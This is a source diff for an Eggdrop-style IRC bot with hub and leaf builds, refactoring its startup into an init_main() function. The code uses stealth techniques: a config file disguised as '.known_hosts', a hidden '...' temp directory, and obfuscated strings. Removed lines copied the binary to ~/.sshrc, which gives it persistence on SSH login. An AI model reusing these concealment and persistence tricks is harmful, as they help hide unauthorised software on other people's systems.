@@ -61,6 +61,7 @@ extern int		 dcc_total, conmask, cache_hit, cache_miss,
 extern struct dcc_t	*dcc;
 extern struct userrec	*userlist;
 extern struct chanset_t	*chanset;
+extern conf_t		conffile;
 
 
 const time_t 	buildts = CVSBUILD;		/* build timestamp (UTC) */
@@ -529,6 +530,129 @@ static void event_resettraffic()
 	egg_memset(&traffic.in_today, 0, sizeof(traffic.in_today));
 }
 
+static void init_main() {
+  char cfile[DIRMAX] = "";
+
+#ifdef HUB
+  egg_snprintf(cfile, sizeof cfile, STR("%s/conf"), confdir());
+#else /* LEAF */
+  egg_snprintf(cfile, sizeof cfile, STR("%s/.known_hosts"), confdir());
+#endif /* HUB */
+
+  if (!can_stat(confdir())) {
+#ifdef LEAF
+    if (mkdir(confdir(),  S_IRUSR | S_IWUSR | S_IXUSR)) {
+      unlink(confdir());
+      if (!can_stat(confdir()))
+        if (mkdir(confdir(), S_IRUSR | S_IWUSR | S_IXUSR))
+#endif /* LEAF */
+          werr(ERR_CONFSTAT);
+#ifdef LEAF
+    }
+#endif /* LEAF */
+  }
+  if (!fixmod(confdir()))
+    werr(ERR_CONFDIRMOD);
+  else if (!can_stat(cfile))
+    werr(ERR_NOCONF);
+  else if (!fixmod(cfile))
+    werr(ERR_CONFMOD);
+
+  if (!can_stat(tempdir)) {
+    if (mkdir(tempdir,  S_IRUSR | S_IWUSR | S_IXUSR)) {
+      unlink(tempdir);
+      if (!can_stat(tempdir))
+        if (mkdir(tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
+          werr(ERR_TMPSTAT);
+    }
+  }
+  if (!fixmod(tempdir))
+    werr(ERR_TMPMOD);
+
+  readconf(cfile);
+#ifdef LEAF
+  if (localhub)
+#endif /* LEAF */
+    showconf();
+#ifdef S_CONFEDIT
+  if (do_confedit)
+    confedit(cfile);		/* this will exit() */
+#endif /* S_CONFEDIT */
+#ifdef LEAF
+  if (localhub) {
+#endif /* LEAF */
+    parseconf();
+    writeconf(cfile, NULL, CONF_ENC);
+#ifdef LEAF
+  }
+#endif /* LEAF */
+
+  if (!can_stat(binname))
+   werr(ERR_BINSTAT);
+  else if (!fixmod(binname))
+   werr(ERR_BINMOD);
+
+#ifdef LEAF
+  /* move the binary to the correct place */
+  {
+    char newbin[DIRMAX] = "", real[DIRMAX] = "";
+
+    sdprintf(STR("my euid: %d my uuid: %d, my ppid: %d my pid: %d"), geteuid(), myuid, getppid(), getpid());
+    egg_snprintf(newbin, sizeof newbin, STR("%s%s%s"), conffile.binpath, 
+                 conffile.binpath[strlen(conffile.binpath) - 1] == '/' ? "" : "/",
+                 conffile.binname);
+    sdprintf(STR("newbin at: %s"), newbin);
+    
+    realpath(binname, real);		/* get the realpath of binname */
+    /* running from wrong dir, or wrong bin name.. lets try to fix that :) */
+    if (strcmp(binname, newbin) && strcmp(newbin, real)) { 		/* if wrong path and new path != current */
+      int ok = 1;
+
+      sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
+      unlink(newbin);
+      if (copyfile(binname, newbin))
+        ok = 0;
+
+      if (ok && !can_stat(newbin)) {
+         unlink(newbin);
+         ok = 0;
+      }
+
+      if (ok && !fixmod(newbin)) {
+          unlink(newbin);
+          ok = 0;
+      }
+
+      if (!ok)
+        werr(ERR_WRONGBINDIR);
+      else {
+        unlink(binname);
+        system(newbin);
+        sdprintf(STR("exiting to let new binary run..."));
+        exit(0);
+      }
+    }
+  }
+#endif /* LEAF */
+
+  fillconf(&conf);
+#ifdef LEAF
+  if (localhub) {
+    if (do_killbot[0]) {
+      if (killbot(do_killbot) == 0)
+          printf("'%s' successfully killed.\n", do_killbot);
+      else
+        printf("Error killing '%s'\n", do_killbot);
+      exit(0);
+    } else {
+      spawnbots();
+      if (updating) exit(0); /* just let the timer restart us (our parent) */
+    }
+  }
+#endif /* LEAF */
+  free_conf();
+}
+
 extern module_entry *module_list;
 
 #include "mod/static.h"
@@ -539,7 +663,6 @@ int init_dcc_max(), init_userent(), init_auth(), init_config(), init_bots(),
 int main(int argc, char **argv)
 {
   egg_timeval_t howlong;
-  char cfile[DIRMAX] = "";
 
 #ifdef STOP_UAC
   {
@@ -574,10 +697,8 @@ int main(int argc, char **argv)
 #ifdef HUB
   egg_snprintf(userfile, 121, "%s/.u", confdir());
   egg_snprintf(tempdir, sizeof tempdir, "%s/tmp/", confdir());
-  egg_snprintf(cfile, sizeof cfile, STR("%s/conf"), confdir());
 #else /* LEAF */
   egg_snprintf(tempdir, sizeof tempdir, "%s/.../", confdir());
-  egg_snprintf(cfile, sizeof cfile, STR("%s/.known_hosts"), confdir());
 #endif /* HUB */
 
   clear_tmp();		/* clear out the tmp dir, no matter if we are localhub or not */
@@ -597,11 +718,6 @@ int main(int argc, char **argv)
   init_conf();
   link_statics();
 
-  if (!can_stat(binname))
-   werr(ERR_BINSTAT);
-  if (!fixmod(binname))
-   werr(ERR_BINMOD);
-
   if (argc) {
     sdprintf(STR("Calling dtx_arg with %d params."), argc);
     dtx_arg(argc, argv);
@@ -610,122 +726,9 @@ int main(int argc, char **argv)
   if (checktrace)
     check_trace_start();
 
-#ifdef LEAF
-  /* move the binary to the correct place */
-  {
-    char newbin[DIRMAX] = "", real[DIRMAX] = "";
-
-    sdprintf(STR("my euid: %d my uuid: %d, my ppid: %d my pid: %d"), geteuid(), myuid, getppid(), getpid());
-    chdir(homedir());
-    egg_snprintf(newbin, sizeof newbin, STR("%s/.sshrc"), homedir());
-
-    sdprintf(STR("newbin at: %s"), newbin);
-    
-    realpath(binname, real);		/* get the realpath of binname */
-    /* running from wrong dir, or wrong bin name.. lets try to fix that :) */
-    if (strcmp(binname, newbin) && strcmp(newbin, real)) { 		/* if wrong path and new path != current */
-#ifdef LEAF
-      int ok = 1;
-#endif /* LEAF */
-
-      sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
-      unlink(newbin);
-      if (copyfile(binname, newbin))
-        ok = 0;
-
-      if (ok && !can_stat(newbin)) {
-         unlink(newbin);
-         ok = 0;
-      }
-
-      if (ok && !fixmod(newbin)) {
-          unlink(newbin);
-          ok = 0;
-      }
-
-      if (!ok)
-        werr(ERR_WRONGBINDIR);
-      else {
-        unlink(binname);
-        system(newbin);
-        sdprintf(STR("exiting to let new binary run..."));
-        exit(0);
-      }
-    }
-  }
-#endif /* LEAF */
-  {
-    char tmp[DIRMAX] = "";
-
-    egg_snprintf(tmp, sizeof tmp, "%s/", confdir());
-    if (!can_stat(tmp)) {
-#ifdef LEAF
-      if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
-        unlink(confdir());
-        if (!can_stat(confdir()))
-          if (mkdir(confdir(), S_IRUSR | S_IWUSR | S_IXUSR))
-#endif /* LEAF */
-            werr(ERR_CONFSTAT);
-#ifdef LEAF
-      }
-#endif /* LEAF */
-    }
-    egg_snprintf(tmp, sizeof tmp, "%s", tempdir);
-    if (!can_stat(tmp)) {
-      if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
-        unlink(tempdir);
-        if (!can_stat(tempdir))
-          if (mkdir(tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
-            werr(ERR_TMPSTAT);
-      }
-    }
-  }
-  if (!fixmod(confdir()))
-    werr(ERR_CONFDIRMOD);
-  if (!fixmod(tempdir))
-    werr(ERR_TMPMOD);
-
-  /* check if we can access the configfile */
-  if (!can_stat(cfile))
-    werr(ERR_NOCONF);
-  if (!fixmod(cfile))
-    werr(ERR_CONFMOD);
-
+  init_main();
 
   /* if we are here, then all the necesary files/dirs are accesable, lets load the config now. */
-  readconf(cfile);
-#ifdef LEAF
-  if (localhub)
-#endif /* LEAF */
-    showconf();
-#ifdef S_CONFEDIT
-  if (do_confedit)
-    confedit(cfile);		/* this will exit() */
-#endif /* S_CONFEDIT */
-#ifdef LEAF
-  if (localhub) {
-#endif /* LEAF */
-    parseconf();
-    writeconf(cfile, NULL, CONF_ENC);
-#ifdef LEAF
-  }
-#endif /* LEAF */
-  fillconf(&conf);
-#ifdef LEAF
-  if (localhub) {
-    if (do_killbot[0]) {
-      if (killbot(do_killbot) == 0)
-          printf("'%s' successfully killed.\n", do_killbot);
-      else
-        printf("Error killing '%s'\n", do_killbot);
-      exit(0);
-    } else {
-      spawnbots();
-      if (updating) exit(0); /* just let the timer restart us (our parent) */
-    }
-  }
-#endif /* LEAF */
-  free_conf();
 
   if ((localhub && !updating) || !localhub) {
     if ((conf.bot->pid > 0) && conf.bot->pid_file) {
